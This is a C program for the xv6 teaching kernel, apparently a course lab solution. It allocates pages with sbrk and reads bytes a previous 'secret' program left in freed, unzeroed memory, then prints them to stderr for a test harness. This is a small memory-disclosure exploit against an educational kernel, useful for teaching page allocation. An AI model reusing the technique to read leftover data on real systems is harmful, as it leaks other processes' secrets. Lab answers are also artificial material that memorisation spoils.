#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // 分配内存，尝试获取到之前 secret 程序写入的内存区域
  // 我们需要分配 17 页内存，然后访问特定位置
  char *end = sbrk(17 * 4096);  // 分配 17 页
  
  // secret写入秘密的是分配的32页中的第10页
  // 所以其前面有22页+5(pagetable)页，
  // attack一开始占用了10页，所以attack只要分配到第17页
  // 偏移量必须大于等于32，因为系统将前32个bit作为链式栈的指针
  char *potential_secret = end + 16 * 4096 + 32;  // 指向可能的秘密位置
  
  // 将找到的可能的秘密写入标准错误（在 attacktest 中被重定向到管道）
  write(2, potential_secret, 8);
  
  exit(0);
}
